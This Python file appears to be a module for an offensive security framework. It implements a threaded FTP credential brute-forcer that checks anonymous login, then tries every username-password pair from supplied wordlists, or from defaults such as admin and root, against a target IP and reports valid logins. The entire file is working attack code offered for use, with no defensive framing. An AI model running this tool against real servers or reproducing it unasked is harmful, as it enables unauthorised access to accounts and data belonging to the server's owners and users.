import ftplib
import threading
import queue
import time

NAME        = "FTP Credential Bruteforcer"
DESCRIPTION = "Threaded FTP brute force with anonymous check and wordlist support"
AUTHOR      = "Wraith"
VERSION     = "2.0"
NOTES       = "Also checks anonymous login before running wordlist."

OPTIONS = {
    "IP":       {"description": "Target IP",                            "required": True,  "default": None},
    "PORT":     {"description": "FTP port",                             "required": False, "default": "21"},
    "USER":     {"description": "Single username (optional)",           "required": False, "default": None},
    "USERLIST": {"description": "Path to usernames file",               "required": False, "default": None},
    "WORDLIST": {"description": "Path to passwords file",               "required": True,  "default": None},
    "THREADS":  {"description": "Concurrent attempts",                  "required": False, "default": "5"},
    "TIMEOUT":  {"description": "Connection timeout (s)",               "required": False, "default": "5"},
}

def try_ftp(ip, port, user, password, timeout):
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, port, timeout=timeout)
        ftp.login(user, password)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except Exception:
        return False

def worker(ip, port, q, results, lock, stop_flag, timeout, tried):
    while not stop_flag[0]:
        try:
            user, pw = q.get_nowait()
        except queue.Empty:
            break
        try:
            with lock:
                tried[0] += 1
            if try_ftp(ip, port, user, pw, timeout):
                with lock:
                    results.append((user, pw))
                stop_flag[0] = True
        except Exception:
            pass
        finally:
            q.task_done()

def run(opts):
    ip       = opts.get("IP")
    port     = int(opts.get("PORT") or 21)
    timeout  = float(opts.get("TIMEOUT") or 5)
    threads  = int(opts.get("THREADS") or 5)
    user_opt = opts.get("USER")
    userlist = opts.get("USERLIST")
    wordlist = opts.get("WORDLIST")

    # always check anon first
    print(f"  \033[96m[*]\033[0m Checking anonymous login first...")
    if try_ftp(ip, port, "anonymous", "anonymous@domain.com", timeout):
        print(f"  \033[92m[+]\033[0m Anonymous login accepted!")
    else:
        print(f"  \033[2m  [-] Anonymous login denied\033[0m")
    print()

    if user_opt:
        users = [user_opt]
    elif userlist:
        try:
            with open(userlist) as f:
                users = [l.strip() for l in f if l.strip()]
        except Exception as e:
            print(f"  \033[91m[-]\033[0m Cannot read USERLIST: {e}")
            return
    else:
        users = ["admin", "ftp", "user", "test", "root"]

    try:
        with open(wordlist) as f:
            passwords = [l.strip() for l in f if l.strip()]
    except Exception as e:
        print(f"  \033[91m[-]\033[0m Cannot read WORDLIST: {e}")
        return

    combos = [(u, p) for u in users for p in passwords]
    print(f"  \033[96m[*]\033[0m {len(combos)} combo(s) | threads={threads}")
    print()

    q         = queue.Queue()
    results   = []
    lock      = threading.Lock()
    stop_flag = [False]
    tried     = [0]

    for c in combos:
        q.put(c)

    workers = [threading.Thread(target=worker, args=(ip, port, q, results, lock, stop_flag, timeout, tried), daemon=True)
               for _ in range(min(threads, len(combos)))]
    for w in workers: w.start()

    total = len(combos)
    while not q.empty() and not stop_flag[0]:
        with lock:
            done = tried[0]
        print(f"  \033[2m  Tried: {done}/{total}\033[0m", end="\r")
        time.sleep(0.3)

    for w in workers: w.join(timeout=1)
    print(" " * 50, end="\r")

    if results:
        print(f"  \033[92m[+]\033[0m Valid credentials:\n")
        for u, p in results:
            print(f"  \033[92m  [+]\033[0m  {u}:{p}")
    else:
        print(f"  \033[91m[-]\033[0m No credentials found ({tried[0]} tried)")
    print()
